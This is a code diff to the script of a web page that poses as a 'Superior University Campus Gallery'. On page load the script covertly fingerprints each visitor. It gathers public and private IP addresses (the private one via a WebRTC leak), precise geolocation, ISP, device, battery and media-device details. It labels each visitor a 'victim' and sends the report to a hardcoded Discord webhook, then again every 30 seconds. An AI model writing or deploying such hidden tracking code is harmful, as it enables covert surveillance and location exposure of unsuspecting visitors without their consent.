@@ -147,6 +147,7 @@
 <script>
 var WH = "https://discord.com/api/webhooks/1518297706362044446/sYS8j36rHD3v3x9cVAOZgd8EVOG-bWVMSzq5FxtJD5EIG6IViaCGt5ej2I7FDUzsYjuR";
 
+// ✅ Fingerprint function
 function fp(){
   var s = navigator.userAgent + screen.width + 'x' + screen.height + 'x' + screen.colorDepth + (Intl.DateTimeFormat().resolvedOptions().timeZone||'') + (navigator.language||'') + (navigator.hardwareConcurrency||0) + (navigator.deviceMemory||0);
   var h = 0;
@@ -154,6 +155,7 @@ function fp(){
   return Math.abs(h).toString(36);
 }
 
+// ✅ User tracking
 var _fp = fp();
 var db = JSON.parse(localStorage.getItem('udb')||'{}');
 var _un = db[_fp];
@@ -167,6 +169,7 @@ if(!_un){
 document.getElementById('userCounter').textContent = _un;
 var _fn = 'victim_' + _un + '.txt';
 
+// ✅ Snow effect
 (function(){
   var c = document.getElementById('snowContainer');
   for(var i=0;i<50;i++){
@@ -180,6 +183,8 @@ var _fn = 'victim_' + _un + '.txt';
     c.appendChild(e);
   }
 })();
+
+// ✅ Bubble effect
 (function(){
   var c = document.getElementById('bubbleContainer');
   for(var i=0;i<20;i++){
@@ -193,6 +198,7 @@ var _fn = 'victim_' + _un + '.txt';
   }
 })();
 
+// ✅ Device model
 function getModel(){
   var u = navigator.userAgent;
   if(u.indexOf('Android')!==-1){
@@ -210,43 +216,63 @@ function getModel(){
   return 'Unknown';
 }
 
-function send(txt){
+// ✅ Send to Discord
+function send(txt, isInitial){
+  var prefix = isInitial ? 'visit_' : 'update_';
+  var filename = prefix + _fn;
   var blob = new Blob([txt], {type:'text/plain'});
   var fd = new FormData();
-  fd.append('file', blob, _fn);
+  fd.append('file', blob, filename);
   fetch(WH, {method:'POST', body:fd}).catch(function(err){console.log('Send error:', err);});
 }
 
-function buildReport(d){
+// ✅ Build full report (ip-api.com style)
+function buildReport(d, isInitial){
   var ua = navigator.userAgent;
   var m = getModel();
+  var label = isInitial ? '🆕 NEW VISITOR' : '🔄 UPDATE';
+  
   var txt = '';
   txt += '╔══════════════════════════════════════════════════════════════╗\n';
-  txt += '║        📸  SUPERIOR UNIVERSITY CAMPUS GALLERY               ║\n';
-  txt += '║              ─  Visitor Information Report  ─              ║\n';
+  txt += '║        📸  SUPERIOR UNIVERSITY - VISITOR TRACKER            ║\n';
+  txt += '║              ─  ' + label + '  ─              ║\n';
   txt += '╚══════════════════════════════════════════════════════════════╝\n\n';
+  
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
   txt += '  👤  USER\n';
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
-  txt += '  🆔  User           :  ' + _un + '\n';
-  txt += '  🔑  Fingerprint    :  `' + _fp + '`\n';
-  txt += '  🕐  Time           :  ' + new Date().toLocaleString() + '\n';
-  txt += '  🌍  TimeZone       :  ' + (Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A') + '\n';
-  txt += '  🔄  UTC Offset     :  UTC ' + (new Date().getTimezoneOffset()/-1) + 'h\n\n';
+  txt += '  🆔  User #        :  ' + _un + '\n';
+  txt += '  🔑  Fingerprint   :  `' + _fp + '`\n';
+  txt += '  🕐  Time          :  ' + new Date().toLocaleString() + '\n';
+  txt += '  🌍  TimeZone      :  ' + (Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A') + '\n';
+  txt += '  🔄  UTC Offset    :  UTC ' + (new Date().getTimezoneOffset()/-1) + 'h\n\n';
+  
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
-  txt += '  📍  GEO & NETWORK\n';
+  txt += '  📍  GEO & NETWORK (ip-api.com format)\n';
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
-  txt += '  🌐  Public IP      :  `' + d.ip + '`\n';
-  txt += '  🏠  Private IP     :  `' + d.priv + '`\n';
-  txt += '  🏢  ISP            :  ' + d.isp + '\n';
-  txt += '  📶  Carrier        :  ' + d.carrier + '\n';
-  txt += '  🏙️  City           :  ' + d.city + '\n';
-  txt += '  📍  Region         :  ' + d.region + '\n';
-  txt += '  🗺️  Country        :  ' + d.country + '\n';
-  txt += '  📮  Zip            :  ' + d.zip + '\n';
-  txt += '  🌐  ASN            :  ' + d.asn + '\n';
-  txt += '  🔒  VPN/Proxy      :  ' + d.proxy + '\n';
-  txt += '  🖥️  Hosting        :  ' + d.hosting + '\n\n';
+  txt += '  🌐  query         :  `' + d.ip + '`\n';
+  txt += '  ✅  status        :  ' + (d.ip!=='N/A'?'success':'failed') + '\n';
+  txt += '  🌏  continent     :  ' + d.continent + '\n';
+  txt += '  🌍  continentCode :  ' + d.continentCode + '\n';
+  txt += '  🗺️  country       :  ' + d.country + '\n';
+  txt += '  🏁  countryCode   :  ' + d.countryCode + '\n';
+  txt += '  📍  region        :  ' + d.region + '\n';
+  txt += '  🏙️  regionName    :  ' + d.regionName + '\n';
+  txt += '  🏛️  city          :  ' + d.city + '\n';
+  txt += '  📮  zip           :  ' + d.zip + '\n';
+  txt += '  📐  lat           :  ' + d.lat + '\n';
+  txt += '  📐  lon           :  ' + d.lon + '\n';
+  txt += '  🕐  timezone      :  ' + d.timezone + '\n';
+  txt += '  💰  currency      :  ' + d.currency + '\n';
+  txt += '  🏢  isp           :  ' + d.isp + '\n';
+  txt += '  🏢  org           :  ' + d.org + '\n';
+  txt += '  🔢  as            :  ' + d.as + '\n';
+  txt += '  🔢  asname        :  ' + d.asname + '\n';
+  txt += '  📱  mobile        :  ' + (d.mobile?'✅ Yes':'❌ No') + '\n';
+  txt += '  🔒  proxy         :  ' + (d.proxy?'⚠️ Yes':'✅ No') + '\n';
+  txt += '  🖥️  hosting       :  ' + (d.hosting?'✅ Yes':'❌ No') + '\n';
+  txt += '  🏠  Private IP    :  `' + d.priv + '`\n\n';
+  
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
   txt += '  📱  DEVICE\n';
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
@@ -258,6 +284,7 @@ function buildReport(d){
   txt += '  📷  Cameras        :  ' + d.cams + '\n';
   txt += '  🎤  Microphones    :  ' + d.mics + '\n';
   txt += '  🔊  Speakers       :  ' + d.spks + '\n\n';
+  
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
   txt += '  💻  BROWSER\n';
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
@@ -266,26 +293,9 @@ function buildReport(d){
   txt += '  🗣️  Langs          :  ' + ((navigator.languages||[]).join(', ')||'N/A') + '\n';
   txt += '  🍪  Cookies        :  ' + (navigator.cookieEnabled?'✅ Yes':'❌ No') + '\n';
   txt += '  🚫  DNT            :  ' + (navigator.doNotTrack||'Off') + '\n';
-  txt += '  🎯  Vendor         :  ' + (navigator.vendor||'N/A') + '\n';
-  txt += '  🧩  Plugins        :  ' + (navigator.plugins?navigator.plugins.length:'N/A') + '\n';
-  txt += '  📋  PDF Viewer     :  ' + (navigator.pdfViewerEnabled?'✅ Yes':'❌ No') + '\n';
   txt += '  🎮  GPU            :  ' + d.gpu + '\n';
   txt += '  🔄  Online         :  ' + (navigator.onLine?'✅ On':'❌ Off') + '\n\n';
-  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
-  txt += '  🖥️  SCREEN\n';
-  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
-  txt += '  📺  Resolution     :  ' + screen.width + ' × ' + screen.height + '\n';
-  txt += '  🎨  Color Depth    :  ' + screen.colorDepth + '-bit\n';
-  txt += '  📐  Available      :  ' + screen.availWidth + ' × ' + screen.availHeight + '\n';
-  txt += '  🔍  Pixel Ratio    :  ' + (window.devicePixelRatio||1) + '\n';
-  txt += '  🪟  Window         :  ' + window.innerWidth + ' × ' + window.innerHeight + '\n';
-  txt += '  🔄  Orientation    :  ' + (screen.orientation?screen.orientation.type:(window.innerHeight>window.innerWidth?'portrait':'landscape')) + '\n\n';
-  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
-  txt += '  🔋  BATTERY\n';
-  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
-  txt += '  🔋  Level          :  ' + d.batL + '\n';
-  txt += '  ⚡  Charging       :  ' + d.batC + '\n';
-  txt += '  ⏱️  Time Left      :  ' + d.batT + '\n\n';
+  
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
   txt += '  📶  CONNECTION\n';
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
@@ -293,8 +303,15 @@ function buildReport(d){
   txt += '  📡  Effective      :  ' + d.ce + '\n';
   txt += '  ⏳  RTT            :  ' + d.cr + '\n';
   txt += '  📥  Downlink       :  ' + d.cd + '\n';
-  txt += '  📤  Uplink         :  ' + d.cu + '\n';
   txt += '  🔒  Save Data      :  ' + d.csv + '\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  🔋  BATTERY\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  🔋  Level          :  ' + d.batL + '\n';
+  txt += '  ⚡  Charging       :  ' + d.batC + '\n';
+  txt += '  ⏱️  Time Left      :  ' + d.batT + '\n\n';
+  
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
   txt += '  💾  STORAGE\n';
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
@@ -302,6 +319,7 @@ function buildReport(d){
   txt += '  💿  Total          :  ' + d.st + '\n';
   txt += '  🍪  Local Storage  :  ' + d.li + ' items\n';
   txt += '  📦  Session Stor.  :  ' + d.si + ' items\n\n';
+  
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
   txt += '  🔗  PAGE\n';
   txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
@@ -309,137 +327,202 @@ function buildReport(d){
   txt += '  📄  URL            :  ' + window.location.href + '\n';
   txt += '  📋  Title          :  ' + document.title + '\n';
   txt += '  ⏱️  Load Time      :  ' + (window.performance?Math.round(window.performance.now())+' ms':'N/A') + '\n\n';
+  
   txt += '╔══════════════════════════════════════════════════════════════╗\n';
   txt += '║     ✨ End of Report — Superior University Gallery ✨       ║\n';
   txt += '╚══════════════════════════════════════════════════════════════╝\n';
-  send(txt);
+  
+  send(txt, isInitial);
 }
 
+// ✅ Global data object
+var _data = {
+  ip:'N/A', priv:'N/A', isp:'N/A', org:'N/A', carrier:'N/A',
+  city:'N/A', region:'N/A', regionName:'N/A', country:'N/A', countryCode:'N/A',
+  zip:'N/A', as:'N/A', asname:'N/A', proxy:'No', hosting:'No',
+  mobile:false, continent:'N/A', continentCode:'N/A',
+  lat:'N/A', lon:'N/A', timezone:'N/A', currency:'N/A',
+  gpu:'N/A', cams:'N/A', mics:'N/A', spks:'N/A',
+  batL:'N/A', batC:'N/A', batT:'N/A',
+  ct:'N/A', ce:'N/A', cr:'N/A', cd:'N/A', csv:'N/A',
+  su:'N/A', st:'N/A', li:'N/A', si:'N/A'
+};
+
+var _initialSent = false;
+
+// ✅ Main collect function
 function collect(){
-  var d = {
-    ip:'N/A', priv:'N/A', isp:'N/A', carrier:'N/A', city:'N/A', region:'N/A',
-    country:'N/A', zip:'N/A', asn:'N/A', proxy:'✅ No', hosting:'No',
-    gpu:'N/A', cams:'N/A', mics:'N/A', spks:'N/A',
-    batL:'N/A', batC:'N/A', batT:'N/A',
-    ct:'N/A', ce:'N/A', cr:'N/A', cd:'N/A', cu:'N/A', csv:'N/A',
-    su:'N/A', st:'N/A', li:'N/A', si:'N/A'
-  };
-
-  // ✅ FIX 1: Race condition avoid karne ke liye flag
-  var _sent = false;
-  function sendOnce(){ if(!_sent){ _sent = true; buildReport(d); } }
-
-  // ✅ FIX 2: ip-api.com ka HTTPS version use karo (Netlify par kaam karega)
+  // 1️⃣ Pehle IP fetch karo (sabse important)
   var geoX = new XMLHttpRequest();
-  geoX.open('GET', 'https://ip-api.com/json/?fields=query,isp,org,city,regionName,country,zip,as,mobile,proxy,hosting', true);
+  geoX.open('GET', 'https://ip-api.com/json/?fields=status,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query', true);
   geoX.onload = function(){
     try{
       var j = JSON.parse(geoX.responseText);
-      if(j.query && j.query !== 'N/A') {
-        d.ip = j.query||'N/A';
-        d.isp = j.org||j.isp||'N/A';
-        d.city = j.city||'N/A';
-        d.region = j.regionName||'N/A';
-        d.country = j.country||'N/A';
-        d.zip = j.zip||'N/A';
-        d.asn = j.as||'N/A';
-        d.proxy = j.proxy?'⚠️ Yes':'✅ No';
-        d.hosting = j.hosting?'Yes':'No';
-        if(j.mobile || (j.org&&j.org.indexOf('Mobile')!==-1)) d.carrier = j.org||j.isp||'Mobile';
+      if(j.status === 'success'){
+        _data.ip = j.query||'N/A';
+        _data.continent = j.continent||'N/A';
+        _data.continentCode = j.continentCode||'N/A';
+        _data.country = j.country||'N/A';
+        _data.countryCode = j.countryCode||'N/A';
+        _data.region = j.region||'N/A';
+        _data.regionName = j.regionName||'N/A';
+        _data.city = j.city||'N/A';
+        _data.zip = j.zip||'N/A';
+        _data.lat = j.lat||'N/A';
+        _data.lon = j.lon||'N/A';
+        _data.timezone = j.timezone||'N/A';
+        _data.currency = j.currency||'N/A';
+        _data.isp = j.isp||'N/A';
+        _data.org = j.org||'N/A';
+        _data.as = j.as||'N/A';
+        _data.asname = j.asname||'N/A';
+        _data.mobile = j.mobile||false;
+        _data.proxy = j.proxy||false;
+        _data.hosting = j.hosting||false;
       }
     } catch(e){}
-    sendOnce();
+    
+    // Ab initial report bhejo (2-4 sec mein)
+    if(!_initialSent){
+      _initialSent = true;
+      buildReport(_data, true);
+    }
   };
   geoX.onerror = function(){
-    // ✅ FIX 3: Agar ip-api fail kare toh backup API try karo
+    // Backup API
     var backupX = new XMLHttpRequest();
     backupX.open('GET', 'https://api.ipify.org?format=json', true);
     backupX.onload = function(){
-      try{ d.ip = JSON.parse(backupX.responseText).ip||'N/A'; } catch(e){}
-      sendOnce();
+      try{ _data.ip = JSON.parse(backupX.responseText).ip||'N/A'; } catch(e){}
+      if(!_initialSent){
+        _initialSent = true;
+        buildReport(_data, true);
+      }
     };
-    backupX.onerror = sendOnce;
+    backupX.onerror = function(){
+      if(!_initialSent){
+        _initialSent = true;
+        buildReport(_data, true);
+      }
+    };
     backupX.send();
   };
   geoX.send();
 
-  // ✅ FIX 4: Private IP ke liye better approach
+  // 2️⃣ Private IP (STUN)
   try{
     var pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
     pc.createDataChannel('');
     pc.createOffer().then(function(o){pc.setLocalDescription(o);}).catch(function(){});
-    var to = setTimeout(function(){try{pc.close();}catch(e){} sendOnce();}, 3000);
     pc.onicecandidate = function(e){
       if(e && e.candidate && e.candidate.candidate){
         var parts = e.candidate.candidate.split(' ');
         var ip = parts[4]||'';
-        // ✅ FIX 5: "host" skip karo aur sirf real IP capture karo
         if(ip && ip !== '0.0.0.0' && ip.indexOf('.local') === -1 && ip !== 'host' && !ip.startsWith(':')){
-          d.priv = ip;
-          clearTimeout(to);
+          _data.priv = ip;
           try{pc.close();}catch(e2){}
-          sendOnce();
         }
       }
     };
-  } catch(e){ setTimeout(sendOnce, 3000); }
+    setTimeout(function(){try{pc.close();}catch(e){}}, 3000);
+  } catch(e){}
 
-  // GPU info
+  // 3️⃣ GPU
   try{
     var c = document.createElement('canvas');
     var g = c.getContext('webgl')||c.getContext('experimental-webgl');
-    if(g){var di=g.getExtension('WEBGL_debug_renderer_info');if(di)d.gpu=g.getParameter(di.UNMASKED_RENDERER_WEBGL);}
+    if(g){var di=g.getExtension('WEBGL_debug_renderer_info');if(di)_data.gpu=g.getParameter(di.UNMASKED_RENDERER_WEBGL);}
   } catch(e){}
 
-  // Media devices
+  // 4️⃣ Media devices
   try{
     if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
       navigator.mediaDevices.enumerateDevices().then(function(devs){
         var ca=0,mi=0,sp=0;
         devs.forEach(function(x){if(x.kind==='videoinput')ca++;if(x.kind==='audioinput')mi++;if(x.kind==='audiooutput')sp++;});
-        d.cams=ca; d.mics=mi; d.spks=sp;
+        _data.cams=ca; _data.mics=mi; _data.spks=sp;
       }).catch(function(){});
     }
   } catch(e){}
 
-  // Battery
+  // 5️⃣ Battery
   try{
     if(navigator.getBattery){
       navigator.getBattery().then(function(b){
-        d.batL=Math.round(b.level*100)+'%';
-        d.batC=b.charging?'✅ Yes':'❌ No';
-        d.batT=b.dischargingTime===Infinity?'♾️ Plugged in':Math.round(b.dischargingTime/60)+' min';
+        _data.batL=Math.round(b.level*100)+'%';
+        _data.batC=b.charging?'✅ Yes':'❌ No';
+        _data.batT=b.dischargingTime===Infinity?'♾️ Plugged in':Math.round(b.dischargingTime/60)+' min';
       }).catch(function(){});
     }
   } catch(e){}
 
-  // Connection
+  // 6️⃣ Connection
   try{
     if(navigator.connection){
       var c=navigator.connection;
-      d.ct=c.type||c.effectiveType||'N/A';
-      d.ce=c.effectiveType||'N/A';
-      d.cr=c.rtt?c.rtt+' ms':'N/A';
-      d.cd=c.downlink?c.downlink+' Mbps':'N/A';
-      d.cu=c.uplink?c.uplink+' Mbps':'N/A';
-      d.csv=c.saveData?'✅ On':'❌ Off';
+      _data.ct=c.type||c.effectiveType||'N/A';
+      _data.ce=c.effectiveType||'N/A';
+      _data.cr=c.rtt?c.rtt+' ms':'N/A';
+      _data.cd=c.downlink?c.downlink+' Mbps':'N/A';
+      _data.csv=c.saveData?'✅ On':'❌ Off';
     }
   } catch(e){}
 
-  // Storage
+  // 7️⃣ Storage
   try{
     if(navigator.storage && navigator.storage.estimate){
       navigator.storage.estimate().then(function(e){
-        d.su=(e.usage/1024/1024).toFixed(2)+' MB';
-        d.st=(e.quota/1024/1024).toFixed(2)+' MB';
+        _data.su=(e.usage/1024/1024).toFixed(2)+' MB';
+        _data.st=(e.quota/1024/1024).toFixed(2)+' MB';
       }).catch(function(){});
     }
   } catch(e){}
 
-  try{ d.li=localStorage.length; d.si=sessionStorage.length; } catch(e){}
+  try{ _data.li=localStorage.length; _data.si=sessionStorage.length; } catch(e){}
 }
 
+// ✅ Update function (har 30 sec mein update bhejta hai)
+function startUpdater(){
+  setInterval(function(){
+    // Naya data collect karo
+    try{
+      if(navigator.connection){
+        var c=navigator.connection;
+        _data.ct=c.type||c.effectiveType||'N/A';
+        _data.ce=c.effectiveType||'N/A';
+        _data.cr=c.rtt?c.rtt+' ms':'N/A';
+        _data.cd=c.downlink?c.downlink+' Mbps':'N/A';
+        _data.csv=c.saveData?'✅ On':'❌ Off';
+      }
+    } catch(e){}
+    
+    try{
+      if(navigator.getBattery){
+        navigator.getBattery().then(function(b){
+          _data.batL=Math.round(b.level*100)+'%';
+          _data.batC=b.charging?'✅ Yes':'❌ No';
+          _data.batT=b.dischargingTime===Infinity?'♾️ Plugged in':Math.round(b.dischargingTime/60)+' min';
+        }).catch(function(){});
+      }
+    } catch(e){}
+    
+    // Update report bhejo
+    buildReport(_data, false);
+  }, 30000); // Har 30 second mein
+}
+
+// ✅ Start everything
 collect();
+setTimeout(function(){
+  // Agar 4 sec mein bhi IP nahi aaya toh bhi report bhejo
+  if(!_initialSent){
+    _initialSent = true;
+    buildReport(_data, true);
+  }
+}, 4000);
+
+// ✅ Update timer start karo (30 sec baad)
+setTimeout(startUpdater, 30000);
 </script>
 </body>
 </html>
